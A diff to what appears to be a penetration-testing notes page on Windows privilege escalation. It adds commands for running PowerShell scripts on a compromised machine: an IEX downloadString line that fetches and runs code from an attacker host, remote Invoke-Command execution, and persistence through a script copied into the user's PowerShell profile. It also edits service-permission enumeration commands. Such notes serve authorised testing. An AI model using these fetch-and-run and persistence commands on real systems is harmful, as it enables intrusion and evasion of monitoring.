@@ -89,6 +89,43 @@ Always ensure you have **explicit** permission to access any computer system **b
   </tbody>
 </table>
 
+### Other Bypass Methods
+
+#### Execute .ps1 scripts on compromised machine: in memory and other bypass methods
+
+If your are able to use `Invoke-Expresion` \(`IEX`\) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.
+
+```text
+IEX (New-Object -TypeName Net.WebClient).downloadString("http://$attacker_ipv4/$script.ps1")
+```
+
+`IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as ATP. Downloading files to a target's machine is not always allowed in a penetration test. Another method to use is `Invoke-Command`. This can be done using the following format.
+
+```text
+Invoke-Command -ComputerName $computer -FilePath .'\$module.ps1m' -Credential (Get-Credential)
+```
+
+This will execute the file and it's contents on the remote computer.
+
+Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.
+
+```text
+Write-Verbose "Creates powershell profile for user"
+New-Item -Path $PROFILE -ItemType File -Force
+#
+# The $PROFILE VARIABLE IS EITHER GOING TO BE
+#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+# OR
+#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
+#
+# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
+cmd /c 'copy \\$attacker_ip>\$script.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1
+
+powershell.exe
+# If that does not work try reloading the user profile.
+& $PROFILE
+```
+
 ## Services
 
 #### Modify service binary path \(_link to persistence pages_\)
@@ -115,10 +152,10 @@ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^
 for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
 ```
 
-You can also use sc and icacls:
+You can also use sc.exe and icacls:
 
 ```text
-sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
+sc.exe query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
 FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
 FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
 ```
